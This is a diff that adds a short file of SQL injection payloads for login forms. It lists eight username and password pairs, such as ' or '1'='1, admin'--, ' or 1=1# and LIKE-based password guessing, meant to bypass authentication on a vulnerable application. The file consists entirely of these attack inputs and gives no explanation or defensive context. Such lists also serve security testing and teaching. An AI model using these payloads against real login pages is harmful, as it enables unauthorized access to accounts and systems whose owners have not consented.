@@ -1,0 +1,31 @@
+Example:
+	username: (' or '1'='1)  (string inside parenthesis)
+	password: (' or password like 'a%)
+
+Example:
+	username: (' or username like 'a%)  (string inside parenthesis)
+	password: (' or password like 'k%)
+
+Example:
+	username: (admin'--)  (string inside parenthesis)
+	password: anything in password
+
+Example:
+	username: (admin' /*)  (string inside parenthesis)
+	password: anything in password
+
+Example:
+	username: (' or 1=1--)  (string inside parenthesis)
+	password: anything in password
+
+Example:
+	username: (' or 1=1#)  (string inside parenthesis)
+	password: anything in password
+
+Example:
+	username: (' or 1=1/*)  (string inside parenthesis)
+	password: anything in password
+
+Example:
+	username: (admin)  (string inside parenthesis)
+	password: (' or password like 'k%)
